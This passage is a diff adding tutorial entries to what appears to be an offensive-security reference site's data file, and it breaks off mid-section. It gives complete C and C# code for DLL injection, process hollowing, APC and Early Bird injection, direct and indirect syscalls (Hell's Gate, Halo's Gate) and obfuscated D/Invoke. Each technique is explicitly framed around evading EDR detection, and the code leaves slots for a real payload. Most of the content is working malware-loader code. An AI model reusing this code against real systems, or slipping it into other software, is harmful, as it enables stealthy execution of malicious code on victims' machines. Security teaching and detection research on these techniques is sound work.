@@ -2346,6 +2346,2330 @@ BOOL UnhookNtdll() {
           language: "c"
         }
       ]
+    },
+    "process-injection": {
+      title: "Process Injection & Memory Manipulation",
+      sections: [
+        {
+          title: "1. Classic DLL Injection - The Foundation",
+          content: `DLL injection forces a remote process to load your DLL by allocating memory, writing the path, and creating a remote thread that calls LoadLibrary.
+
+WHY IT WORKS:
+• Every process can call LoadLibrary to load DLLs
+• CreateRemoteThread creates a thread in another process
+• The thread executes your specified function (LoadLibraryA)
+• Your DLL's DllMain runs in the target's context
+
+DETECTION SURFACE:
+• CreateRemoteThread is heavily monitored by EDR
+• WriteProcessMemory to executable memory triggers alerts
+• Suspicious modules loaded detected by module enumeration`,
+          code: `#include <windows.h>
+#include <stdio.h>
+
+BOOL InjectDLL(DWORD dwPid, const char* szDll) {
+    // 1. Open target process
+    HANDLE hProcess = OpenProcess(
+        PROCESS_ALL_ACCESS, FALSE, dwPid);
+    
+    if (!hProcess) {
+        printf("[-] OpenProcess failed: %lu\\n", 
+               GetLastError());
+        return FALSE;
+    }
+    
+    // 2. Allocate memory for DLL path
+    SIZE_T pathLen = strlen(szDll) + 1;
+    LPVOID pRemoteBuf = VirtualAllocEx(
+        hProcess, NULL, pathLen,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE);
+    
+    if (!pRemoteBuf) {
+        printf("[-] VirtualAllocEx failed\\n");
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    // 3. Write DLL path to remote memory
+    if (!WriteProcessMemory(hProcess, pRemoteBuf,
+                            szDll, pathLen, NULL)) {
+        printf("[-] WriteProcessMemory failed\\n");
+        VirtualFreeEx(hProcess, pRemoteBuf, 
+                      0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    // 4. Get LoadLibraryA address
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    LPTHREAD_START_ROUTINE pfnLoadLib = 
+        (LPTHREAD_START_ROUTINE)GetProcAddress(
+            hKernel32, "LoadLibraryA");
+    
+    // 5. Create remote thread
+    HANDLE hThread = CreateRemoteThread(
+        hProcess, NULL, 0, pfnLoadLib,
+        pRemoteBuf, 0, NULL);
+    
+    if (!hThread) {
+        printf("[-] CreateRemoteThread failed\\n");
+        VirtualFreeEx(hProcess, pRemoteBuf, 
+                      0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    // 6. Wait and cleanup
+    WaitForSingleObject(hThread, INFINITE);
+    
+    printf("[+] DLL injected successfully\\n");
+    
+    CloseHandle(hThread);
+    VirtualFreeEx(hProcess, pRemoteBuf, 
+                  0, MEM_RELEASE);
+    CloseHandle(hProcess);
+    
+    return TRUE;
+}
+
+// Example DLL (inject_dll.c)
+// Compile: cl /LD inject_dll.c
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+                      DWORD reason,
+                      LPVOID lpReserved) {
+    switch (reason) {
+    case DLL_PROCESS_ATTACH:
+        MessageBoxA(NULL, 
+            "Injected!", "Success", MB_OK);
+        // Run your payload here
+        break;
+    }
+    return TRUE;
+}`,
+          language: "c"
+        },
+        {
+          title: "2. Process Hollowing - Running in Plain Sight",
+          content: `Process hollowing creates a legitimate process in suspended state, replaces its memory with malicious code, then resumes execution. The process appears legitimate in Task Manager but runs your code.
+
+TECHNIQUE BREAKDOWN:
+1. Create legitimate process suspended (CREATE_SUSPENDED)
+2. Get its base address from PEB
+3. Unmap the legitimate image (NtUnmapViewOfSection)
+4. Allocate new memory at same base
+5. Write malicious PE file
+6. Fix entry point in thread context
+7. Resume thread
+
+EVASION BENEFITS:
+• Legitimate process name in Task Manager
+• Legitimate parent-child relationship
+• Signature verification passes (for host process)`,
+          code: `#include <windows.h>
+#include <winternl.h>
+#include <stdio.h>
+
+// Link ntdll for native APIs
+#pragma comment(lib, "ntdll.lib")
+
+// Function pointer for NtUnmapViewOfSection
+typedef NTSTATUS (WINAPI *pfnNtUnmapViewOfSection)(
+    HANDLE, PVOID);
+
+BOOL ProcessHollowing(const char* szTarget,
+                      const char* szPayload) {
+    
+    // 1. Read malicious PE
+    HANDLE hFile = CreateFileA(szPayload,
+        GENERIC_READ, FILE_SHARE_READ, NULL,
+        OPEN_EXISTING, 0, NULL);
+    
+    DWORD dwSize = GetFileSize(hFile, NULL);
+    BYTE* pImage = (BYTE*)malloc(dwSize);
+    ReadFile(hFile, pImage, dwSize, &dwSize, NULL);
+    CloseHandle(hFile);
+    
+    // 2. Create target in suspended state
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    
+    if (!CreateProcessA(szTarget, NULL, NULL, NULL,
+        FALSE, CREATE_SUSPENDED, NULL, NULL,
+        &si, &pi)) {
+        printf("[-] CreateProcess failed\\n");
+        return FALSE;
+    }
+    
+    printf("[+] Created suspended process: %lu\\n", 
+           pi.dwProcessId);
+    
+    // 3. Get base address from PEB
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(pi.hThread, &ctx);
+    
+    // Rdx points to PEB on x64
+    PVOID pPeb = (PVOID)ctx.Rdx;
+    PVOID pImageBase;
+    
+    // ImageBase is at PEB + 0x10
+    ReadProcessMemory(pi.hProcess,
+        (BYTE*)pPeb + 0x10,
+        &pImageBase, sizeof(pImageBase), NULL);
+    
+    printf("[+] Original image base: %p\\n", 
+           pImageBase);
+    
+    // 4. Unmap original image
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    pfnNtUnmapViewOfSection NtUnmap = 
+        (pfnNtUnmapViewOfSection)GetProcAddress(
+            hNtdll, "NtUnmapViewOfSection");
+    
+    NtUnmap(pi.hProcess, pImageBase);
+    
+    // 5. Parse PE headers
+    PIMAGE_DOS_HEADER pDos = 
+        (PIMAGE_DOS_HEADER)pImage;
+    PIMAGE_NT_HEADERS pNt = 
+        (PIMAGE_NT_HEADERS)(pImage + 
+                            pDos->e_lfanew);
+    
+    // 6. Allocate new memory
+    PVOID pNewBase = VirtualAllocEx(pi.hProcess,
+        pImageBase, pNt->OptionalHeader.SizeOfImage,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE);
+    
+    if (!pNewBase) {
+        printf("[-] VirtualAllocEx failed\\n");
+        TerminateProcess(pi.hProcess, 0);
+        return FALSE;
+    }
+    
+    // 7. Write PE headers
+    WriteProcessMemory(pi.hProcess, pNewBase,
+        pImage, pNt->OptionalHeader.SizeOfHeaders,
+        NULL);
+    
+    // 8. Write sections
+    PIMAGE_SECTION_HEADER pSect = IMAGE_FIRST_SECTION(pNt);
+    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+        WriteProcessMemory(pi.hProcess,
+            (BYTE*)pNewBase + pSect[i].VirtualAddress,
+            pImage + pSect[i].PointerToRawData,
+            pSect[i].SizeOfRawData, NULL);
+    }
+    
+    // 9. Update entry point
+    ctx.Rcx = (DWORD64)pNewBase + 
+              pNt->OptionalHeader.AddressOfEntryPoint;
+    SetThreadContext(pi.hThread, &ctx);
+    
+    // 10. Resume execution
+    printf("[+] Resuming process...\\n");
+    ResumeThread(pi.hThread);
+    
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    free(pImage);
+    
+    return TRUE;
+}`,
+          language: "c"
+        },
+        {
+          title: "3. APC Queue Injection - Stealthy Execution",
+          content: `APC (Asynchronous Procedure Call) injection queues your code to execute when a thread enters an alertable wait state. More stealthy than CreateRemoteThread as it uses Windows' legitimate alerting mechanism.
+
+HOW IT WORKS:
+• Every thread has an APC queue
+• When thread enters alertable wait (SleepEx, WaitForSingleObjectEx), APCs execute
+• QueueUserAPC adds function to execute
+• No CreateRemoteThread = less detection
+
+BEST TARGET THREADS:
+• GUI threads (always alertable for messages)
+• Threads calling Sleep/WaitForSingleObject
+• Worker threads in thread pools`,
+          code: `#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+
+// Shellcode to execute via APC
+// This would be your actual payload
+unsigned char shellcode[] = {
+    0x90, 0x90, 0x90,  // NOPs (replace with real shellcode)
+    0xC3                // RET
+};
+
+BOOL InjectAPC(DWORD dwPid) {
+    // 1. Open target process
+    HANDLE hProcess = OpenProcess(
+        PROCESS_ALL_ACCESS, FALSE, dwPid);
+    
+    if (!hProcess) {
+        printf("[-] OpenProcess failed\\n");
+        return FALSE;
+    }
+    
+    // 2. Allocate executable memory
+    LPVOID pRemoteBuf = VirtualAllocEx(hProcess,
+        NULL, sizeof(shellcode),
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE);
+    
+    if (!pRemoteBuf) {
+        printf("[-] VirtualAllocEx failed\\n");
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    // 3. Write shellcode
+    if (!WriteProcessMemory(hProcess, pRemoteBuf,
+        shellcode, sizeof(shellcode), NULL)) {
+        printf("[-] WriteProcessMemory failed\\n");
+        VirtualFreeEx(hProcess, pRemoteBuf, 
+                      0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    printf("[+] Shellcode written to %p\\n", 
+           pRemoteBuf);
+    
+    // 4. Enumerate threads
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(
+        TH32CS_SNAPTHREAD, 0);
+    
+    THREADENTRY32 te;
+    te.dwSize = sizeof(te);
+    
+    int queuedCount = 0;
+    
+    if (Thread32First(hSnapshot, &te)) {
+        do {
+            // Only queue to target process threads
+            if (te.th32OwnerProcessID == dwPid) {
+                HANDLE hThread = OpenThread(
+                    THREAD_SET_CONTEXT, FALSE,
+                    te.th32ThreadID);
+                
+                if (hThread) {
+                    // Queue APC to thread
+                    QueueUserAPC(
+                        (PAPCFUNC)pRemoteBuf,
+                        hThread, 0);
+                    
+                    queuedCount++;
+                    CloseHandle(hThread);
+                }
+            }
+        } while (Thread32Next(hSnapshot, &te));
+    }
+    
+    CloseHandle(hSnapshot);
+    
+    printf("[+] Queued APC to %d threads\\n", 
+           queuedCount);
+    printf("[*] Waiting for alertable wait...\\n");
+    
+    CloseHandle(hProcess);
+    return TRUE;
+}
+
+// ADVANCED: Early Bird APC
+// Inject before process starts executing
+
+BOOL EarlyBirdAPC(const char* szTarget) {
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    
+    // Create suspended
+    CreateProcessA(szTarget, NULL, NULL, NULL,
+        FALSE, CREATE_SUSPENDED, NULL, NULL,
+        &si, &pi);
+    
+    // Allocate and write shellcode
+    LPVOID pBuf = VirtualAllocEx(pi.hProcess,
+        NULL, sizeof(shellcode),
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE);
+    
+    WriteProcessMemory(pi.hProcess, pBuf,
+        shellcode, sizeof(shellcode), NULL);
+    
+    // Queue APC before process starts
+    QueueUserAPC((PAPCFUNC)pBuf, 
+                 pi.hThread, 0);
+    
+    // Resume - APC executes immediately
+    ResumeThread(pi.hThread);
+    
+    printf("[+] Early Bird APC executed\\n");
+    
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    
+    return TRUE;
+}`,
+          language: "c"
+        }
+      ]
+    },
+    "syscalls": {
+      title: "Direct Syscalls & Native API",
+      sections: [
+        {
+          title: "1. Understanding System Service Numbers (SSN)",
+          content: `Every Windows API call eventually invokes a syscall. The System Service Number (SSN) identifies which kernel function to execute. EDRs hook user-mode APIs (ntdll.dll), but direct syscalls bypass these hooks.
+
+SSN LOCATION:
+• Each Nt* function in ntdll.dll contains its SSN
+• First instruction: MOV R10, RCX (save arg)
+• Second instruction: MOV EAX, SSN
+• Third instruction: SYSCALL
+
+EXAMPLE (NtReadVirtualMemory):
+  4C 8B D1          mov r10, rcx
+  B8 3F 00 00 00    mov eax, 0x3F    ; SSN = 0x3F
+  0F 05             syscall
+
+WHY THIS MATTERS:
+• SSNs change between Windows versions
+• Direct syscalls skip ntdll hooks entirely
+• EDR cannot monitor what they can't see`,
+          code: `#include <windows.h>
+#include <stdio.h>
+
+// Define native API structures
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR Buffer;
+} UNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG Length;
+    HANDLE RootDirectory;
+    UNICODE_STRING* ObjectName;
+    ULONG Attributes;
+    PVOID SecurityDescriptor;
+    PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES;
+
+// Parse SSN from function
+DWORD GetSSN(BYTE* pFunc) {
+    // Check for MOV EAX, imm32
+    // Bytes: B8 XX XX XX XX
+    if (pFunc[0] == 0x4C &&   // mov r10, rcx
+        pFunc[3] == 0xB8) {   // mov eax, imm32
+        // SSN is 4 bytes after 0xB8
+        return *(DWORD*)(pFunc + 4);
+    }
+    
+    return 0xFFFFFFFF;
+}
+
+void DemoSSNExtraction() {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    
+    // Get function addresses
+    BYTE* pNtReadVM = (BYTE*)GetProcAddress(
+        hNtdll, "NtReadVirtualMemory");
+    BYTE* pNtWriteVM = (BYTE*)GetProcAddress(
+        hNtdll, "NtWriteVirtualMemory");
+    BYTE* pNtAllocVM = (BYTE*)GetProcAddress(
+        hNtdll, "NtAllocateVirtualMemory");
+    
+    // Extract SSNs
+    DWORD ssnRead = GetSSN(pNtReadVM);
+    DWORD ssnWrite = GetSSN(pNtWriteVM);
+    DWORD ssnAlloc = GetSSN(pNtAllocVM);
+    
+    printf("NtReadVirtualMemory SSN: 0x%X\\n", 
+           ssnRead);
+    printf("NtWriteVirtualMemory SSN: 0x%X\\n", 
+           ssnWrite);
+    printf("NtAllocateVirtualMemory SSN: 0x%X\\n",
+           ssnAlloc);
+}
+
+// Manual syscall stub (x64)
+// This would be in assembly file
+
+extern "C" NTSTATUS SysNtReadVirtualMemory(
+    HANDLE ProcessHandle,
+    PVOID BaseAddress,
+    PVOID Buffer,
+    SIZE_T BufferSize,
+    PSIZE_T NumberOfBytesRead
+);
+
+// In .asm file (NASM syntax):
+/*
+BITS 64
+DEFAULT REL
+
+global SysNtReadVirtualMemory
+
+SysNtReadVirtualMemory:
+    mov r10, rcx
+    mov eax, 0x3F        ; SSN for NtReadVirtualMemory
+    syscall
+    ret
+*/
+
+// Usage
+void DirectSyscallExample() {
+    HANDLE hProcess = OpenProcess(
+        PROCESS_ALL_ACCESS, FALSE, 1234);
+    
+    BYTE buffer[256];
+    SIZE_T bytesRead;
+    
+    // Direct syscall - bypasses hooks!
+    NTSTATUS status = SysNtReadVirtualMemory(
+        hProcess,
+        (PVOID)0x400000,
+        buffer,
+        sizeof(buffer),
+        &bytesRead
+    );
+    
+    if (status == 0) {  // STATUS_SUCCESS
+        printf("[+] Read %zu bytes\\n", bytesRead);
+    }
+    
+    CloseHandle(hProcess);
+}`,
+          language: "c"
+        },
+        {
+          title: "2. Hell's Gate - Dynamic SSN Resolution",
+          content: `Hell's Gate technique dynamically resolves SSNs at runtime by parsing ntdll.dll. This handles different Windows versions without hardcoding SSNs.
+
+THE PROBLEM:
+• SSNs differ: Win10 vs Win11
+• SSNs change with updates
+• Hardcoded SSNs = brittle code
+
+HELL'S GATE SOLUTION:
+1. Find function in ntdll.dll
+2. Parse first few bytes
+3. Extract SSN from MOV EAX
+4. Store for syscall stub
+
+DETECTION EVASION:
+• No hardcoded SSNs in binary
+• Works across Windows versions
+• Adapts to system automatically`,
+          code: `#include <windows.h>
+#include <stdio.h>
+
+typedef struct _SYSCALL_STUB {
+    DWORD ssn;           // System Service Number
+    PVOID pSyscallAddr;  // Address of syscall instruction
+} SYSCALL_STUB;
+
+// Parse SSN with hook detection
+BOOL GetSSN_HellsGate(const char* szFunc,
+                      SYSCALL_STUB* stub) {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    BYTE* pFunc = (BYTE*)GetProcAddress(
+        hNtdll, szFunc);
+    
+    if (!pFunc) return FALSE;
+    
+    // Check for hooks (JMP instruction)
+    if (pFunc[0] == 0xE9 || pFunc[0] == 0xEB) {
+        printf("[!] %s appears hooked!\\n", szFunc);
+        // Fall back to nearby function or fail
+        return FALSE;
+    }
+    
+    // Pattern: 4C 8B D1 B8 [SSN] 00 00 00
+    if (pFunc[0] == 0x4C &&
+        pFunc[1] == 0x8B &&
+        pFunc[2] == 0xD1 &&
+        pFunc[3] == 0xB8) {
+        
+        stub->ssn = *(DWORD*)(pFunc + 4);
+        
+        // Find syscall instruction
+        for (int i = 0; i < 32; i++) {
+            if (pFunc[i] == 0x0F && 
+                pFunc[i+1] == 0x05) {
+                stub->pSyscallAddr = &pFunc[i];
+                return TRUE;
+            }
+        }
+    }
+    
+    return FALSE;
+}
+
+// Halo's Gate enhancement
+// If function is hooked, check neighbors
+BOOL GetSSN_HalosGate(const char* szFunc,
+                      SYSCALL_STUB* stub) {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    BYTE* pFunc = (BYTE*)GetProcAddress(
+        hNtdll, szFunc);
+    
+    // Try function itself
+    if (GetSSN_HellsGate(szFunc, stub))
+        return TRUE;
+    
+    printf("[*] Function hooked, trying neighbors\\n");
+    
+    // Function is hooked, check nearby functions
+    // SSNs are sequential in ntdll
+    
+    BYTE* pCurrent = pFunc;
+    
+    // Check down (next functions)
+    for (int i = 1; i <= 5; i++) {
+        // Skip to next function (average ~32 bytes)
+        pCurrent += 32;
+        
+        // Check pattern
+        if (pCurrent[0] == 0x4C &&
+            pCurrent[1] == 0x8B &&
+            pCurrent[2] == 0xD1 &&
+            pCurrent[3] == 0xB8) {
+            
+            DWORD neighborSSN = *(DWORD*)(pCurrent + 4);
+            // Our SSN is likely neighborSSN - i
+            stub->ssn = neighborSSN - i;
+            
+            // Find syscall instruction
+            for (int j = 0; j < 32; j++) {
+                if (pCurrent[j] == 0x0F &&
+                    pCurrent[j+1] == 0x05) {
+                    stub->pSyscallAddr = &pCurrent[j];
+                    printf("[+] Resolved SSN via neighbor: 0x%X\\n",
+                           stub->ssn);
+                    return TRUE;
+                }
+            }
+        }
+    }
+    
+    return FALSE;
+}
+
+// Dynamic syscall function
+typedef NTSTATUS (*fnSyscall)(
+    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+
+NTSTATUS DynamicSyscall(SYSCALL_STUB* stub,
+    HANDLE hProcess, PVOID addr, PVOID buf,
+    SIZE_T size, PSIZE_T read) {
+    
+    // Build syscall on stack
+    BYTE syscallStub[] = {
+        0x4C, 0x8B, 0xD1,              // mov r10, rcx
+        0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, SSN
+        0x0F, 0x05,                     // syscall
+        0xC3                            // ret
+    };
+    
+    // Patch in SSN
+    *(DWORD*)(syscallStub + 4) = stub->ssn;
+    
+    // Make executable
+    DWORD oldProtect;
+    VirtualProtect(syscallStub, sizeof(syscallStub),
+                   PAGE_EXECUTE_READ, &oldProtect);
+    
+    // Execute
+    fnSyscall pSyscall = (fnSyscall)syscallStub;
+    return pSyscall(hProcess, addr, buf, size, read);
+}`,
+          language: "c"
+        },
+        {
+          title: "3. Indirect Syscalls - Maximum Stealth",
+          content: `Indirect syscalls execute the syscall instruction from ntdll.dll itself, making call stack look legitimate. Instead of embedding syscall in your code, jump to ntdll's syscall.
+
+CALL STACK DIFFERENCE:
+
+Direct Syscall:
+YourModule.exe → syscall → kernel
+
+Indirect Syscall:
+YourModule.exe → ntdll.dll → syscall → kernel
+
+WHY IT MATTERS:
+• Call stack analysis looks normal
+• syscall from ntdll (expected)
+• Harder for EDR to detect
+• More stealthy than direct`,
+          code: `#include <windows.h>
+#include <stdio.h>
+
+typedef struct _SYSCALL_INDIRECT {
+    DWORD ssn;
+    PVOID pSyscallInstr;  // Actual syscall in ntdll
+    PVOID pSyscallRet;    // Return address after syscall
+} SYSCALL_INDIRECT;
+
+// Find a clean syscall instruction in ntdll
+PVOID FindSyscallGadget() {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    BYTE* pBase = (BYTE*)hNtdll;
+    
+    // Parse PE to get .text section
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
+    PIMAGE_NT_HEADERS pNt = 
+        (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
+    
+    PIMAGE_SECTION_HEADER pSect = 
+        IMAGE_FIRST_SECTION(pNt);
+    
+    // Find .text section
+    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+        if (strcmp((char*)pSect[i].Name, ".text") == 0) {
+            BYTE* pText = pBase + pSect[i].VirtualAddress;
+            SIZE_T textSize = pSect[i].Misc.VirtualSize;
+            
+            // Search for: syscall; ret (0F 05 C3)
+            for (SIZE_T j = 0; j < textSize - 3; j++) {
+                if (pText[j] == 0x0F &&
+                    pText[j+1] == 0x05 &&
+                    pText[j+2] == 0xC3) {
+                    return &pText[j];
+                }
+            }
+        }
+    }
+    
+    return NULL;
+}
+
+// Setup indirect syscall
+BOOL SetupIndirectSyscall(const char* szFunc,
+                          SYSCALL_INDIRECT* sc) {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    BYTE* pFunc = (BYTE*)GetProcAddress(hNtdll, szFunc);
+    
+    if (!pFunc) return FALSE;
+    
+    // Get SSN
+    if (pFunc[0] == 0x4C && pFunc[3] == 0xB8) {
+        sc->ssn = *(DWORD*)(pFunc + 4);
+    } else {
+        return FALSE;
+    }
+    
+    // Find syscall gadget
+    sc->pSyscallInstr = FindSyscallGadget();
+    if (!sc->pSyscallInstr) {
+        printf("[-] No syscall gadget found\\n");
+        return FALSE;
+    }
+    
+    printf("[+] Using syscall at: %p\\n", 
+           sc->pSyscallInstr);
+    
+    return TRUE;
+}
+
+// Indirect syscall stub (assembly)
+/*
+BITS 64
+DEFAULT REL
+
+global IndirectSyscall
+
+IndirectSyscall:
+    mov r10, rcx                ; Save RCX
+    mov eax, [rsp+8]            ; Load SSN from stack
+    mov r11, [rsp+16]           ; Load syscall address
+    jmp r11                     ; Jump to ntdll's syscall
+*/
+
+extern "C" NTSTATUS IndirectSyscall(
+    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T,
+    DWORD, PVOID);
+
+// Usage
+void IndirectSyscallExample() {
+    SYSCALL_INDIRECT sc;
+    
+    if (!SetupIndirectSyscall("NtReadVirtualMemory", 
+                              &sc)) {
+        printf("[-] Setup failed\\n");
+        return;
+    }
+    
+    HANDLE hProcess = OpenProcess(
+        PROCESS_ALL_ACCESS, FALSE, 1234);
+    
+    BYTE buffer[256];
+    SIZE_T bytesRead;
+    
+    // Indirect syscall
+    NTSTATUS status = IndirectSyscall(
+        hProcess,
+        (PVOID)0x400000,
+        buffer,
+        sizeof(buffer),
+        &bytesRead,
+        sc.ssn,              // Pass SSN
+        sc.pSyscallInstr     // Pass syscall address
+    );
+    
+    if (status == 0) {
+        printf("[+] Read %zu bytes (indirect)\\n", 
+               bytesRead);
+    }
+    
+    CloseHandle(hProcess);
+}
+
+// Stack spoof for even more stealth
+// Modify return address before syscall
+void StackSpoofedSyscall() {
+    // Advanced: Modify call stack to appear
+    // as if called from legitimate Windows module
+    // (Left as exercise - research ROP chains)
+}`,
+          language: "c"
+        }
+      ]
+    },
+    "pinvoke": {
+      title: "P/Invoke & .NET Interop",
+      sections: [
+        {
+          title: "1. P/Invoke Fundamentals - Calling Native APIs",
+          content: `P/Invoke (Platform Invocation Services) allows C# to call native Win32 APIs. This is essential for offensive .NET tools since managed APIs are limited.
+
+HOW IT WORKS:
+• CLR loads native DLL (kernel32.dll, ntdll.dll)
+• Marshals managed types to native types
+• Calls native function
+• Marshals return value back to managed
+
+COMMON USE CASES:
+• Process injection from C#
+• Direct Win32 API access
+• Syscalls from .NET
+• Memory manipulation`,
+          code: `using System;
+using System.Runtime.InteropServices;
+using System.Text;
+
+class WinAPI {
+    // Basic P/Invoke syntax
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr OpenProcess(
+        uint dwDesiredAccess,
+        bool bInheritHandle,
+        uint dwProcessId
+    );
+    
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+    
+    // Marshalling structures
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_BASIC_INFORMATION {
+        public IntPtr Reserved1;
+        public IntPtr PebBaseAddress;
+        public IntPtr Reserved2_0;
+        public IntPtr Reserved2_1;
+        public IntPtr UniqueProcessId;
+        public IntPtr InheritedFromUniqueProcessId;
+    }
+    
+    // Character set handling
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
+    public static extern uint GetModuleFileNameW(
+        IntPtr hModule,
+        StringBuilder lpFilename,
+        uint nSize
+    );
+    
+    // Out parameters
+    [DllImport("kernel32.dll")]
+    public static extern bool ReadProcessMemory(
+        IntPtr hProcess,
+        IntPtr lpBaseAddress,
+        byte[] lpBuffer,
+        int nSize,
+        out int lpNumberOfBytesRead
+    );
+}
+
+class Program {
+    static void Main() {
+        // Open process
+        uint PROCESS_ALL_ACCESS = 0x1F0FFF;
+        IntPtr hProcess = WinAPI.OpenProcess(
+            PROCESS_ALL_ACCESS, false, 1234);
+        
+        if (hProcess == IntPtr.Zero) {
+            Console.WriteLine("OpenProcess failed");
+            return;
+        }
+        
+        // Read memory
+        byte[] buffer = new byte[256];
+        int bytesRead;
+        
+        bool success = WinAPI.ReadProcessMemory(
+            hProcess,
+            (IntPtr)0x400000,
+            buffer,
+            buffer.Length,
+            out bytesRead
+        );
+        
+        Console.WriteLine($"Read {bytesRead} bytes");
+        
+        // Get module path
+        StringBuilder path = new StringBuilder(260);
+        WinAPI.GetModuleFileNameW(
+            IntPtr.Zero, path, 260);
+        
+        Console.WriteLine($"Path: {path}");
+        
+        WinAPI.CloseHandle(hProcess);
+    }
+}
+
+// MARSHALLING GUIDE
+// =================
+
+// Pointers: IntPtr
+// Strings: StringBuilder or string
+// Arrays: byte[], int[]
+// Structures: [StructLayout]
+// Callbacks: delegates
+// Handles: IntPtr or SafeHandle
+
+// Common attributes:
+// CharSet.Unicode - wchar_t*
+// CharSet.Ansi - char*
+// SetLastError = true - enables Marshal.GetLastWin32Error()
+// CallingConvention - for non-stdcall functions`,
+          language: "csharp"
+        },
+        {
+          title: "2. D/Invoke - Dynamic API Resolution",
+          content: `D/Invoke dynamically resolves APIs at runtime using GetProcAddress, avoiding static imports that EDR can enumerate. This is P/Invoke's stealthy cousin.
+
+WHY D/INVOKE:
+• No imports in PE file
+• API names not visible in strings
+• Can resolve from memory-mapped DLLs
+• Defeats static analysis
+
+THE TECHNIQUE:
+1. LoadLibrary or manual map DLL
+2. GetProcAddress for function
+3. Marshal.GetDelegateForFunctionPointer
+4. Call as normal delegate`,
+          code: `using System;
+using System.Runtime.InteropServices;
+
+class DInvoke {
+    // Delegate matching native function signature
+    [UnmanagedFunctionPointer(CallingConvention.StdCall,
+                              SetLastError = true)]
+    public delegate IntPtr OpenProcessDelegate(
+        uint dwDesiredAccess,
+        bool bInheritHandle,
+        uint dwProcessId
+    );
+    
+    // Load kernel32.dll
+    [DllImport("kernel32.dll")]
+    static extern IntPtr LoadLibrary(string lpFileName);
+    
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
+    static extern IntPtr GetProcAddress(
+        IntPtr hModule, string lpProcName);
+    
+    // Generic D/Invoke wrapper
+    public static Delegate GetAPIDelegate<T>(
+        string moduleName, string functionName) {
+        
+        // Load DLL
+        IntPtr hModule = LoadLibrary(moduleName);
+        if (hModule == IntPtr.Zero) {
+            throw new Exception("LoadLibrary failed");
+        }
+        
+        // Get function address
+        IntPtr pFunc = GetProcAddress(hModule, functionName);
+        if (pFunc == IntPtr.Zero) {
+            throw new Exception("GetProcAddress failed");
+        }
+        
+        // Convert to delegate
+        return Marshal.GetDelegateForFunctionPointer(
+            pFunc, typeof(T));
+    }
+}
+
+class Program {
+    static void Main() {
+        // Dynamically resolve OpenProcess
+        var OpenProcess = (DInvoke.OpenProcessDelegate)
+            DInvoke.GetAPIDelegate<DInvoke.OpenProcessDelegate>(
+                "kernel32.dll", "OpenProcess");
+        
+        // Use like normal P/Invoke
+        IntPtr hProcess = OpenProcess(
+            0x1F0FFF, false, 1234);
+        
+        Console.WriteLine($"Handle: 0x{hProcess:X}");
+        
+        // Advanced: Resolve from ntdll
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        delegate uint NtReadVirtualMemoryDelegate(
+            IntPtr ProcessHandle,
+            IntPtr BaseAddress,
+            byte[] Buffer,
+            int NumberOfBytesToRead,
+            out int NumberOfBytesRead
+        );
+        
+        var NtReadVirtualMemory = 
+            (NtReadVirtualMemoryDelegate)
+            DInvoke.GetAPIDelegate<NtReadVirtualMemoryDelegate>(
+                "ntdll.dll", "NtReadVirtualMemory");
+        
+        byte[] buffer = new byte[256];
+        int bytesRead;
+        
+        uint status = NtReadVirtualMemory(
+            hProcess,
+            (IntPtr)0x400000,
+            buffer,
+            buffer.Length,
+            out bytesRead
+        );
+        
+        Console.WriteLine($"NTSTATUS: 0x{status:X}");
+    }
+}
+
+// OBFUSCATION ENHANCEMENT
+// =======================
+
+class ObfuscatedDInvoke {
+    // XOR obfuscate strings
+    static string Deobfuscate(byte[] data, byte key) {
+        char[] result = new char[data.Length];
+        for (int i = 0; i < data.Length; i++) {
+            result[i] = (char)(data[i] ^ key);
+        }
+        return new string(result);
+    }
+    
+    static void Main() {
+        // Obfuscated "kernel32.dll"
+        byte[] dllName = { 
+            0x0E, 0x02, 0x11, 0x17, 0x02, 0x05, 
+            0x66, 0x65, 0x23, 0x01, 0x05, 0x05 
+        };
+        
+        // Obfuscated "OpenProcess"
+        byte[] funcName = {
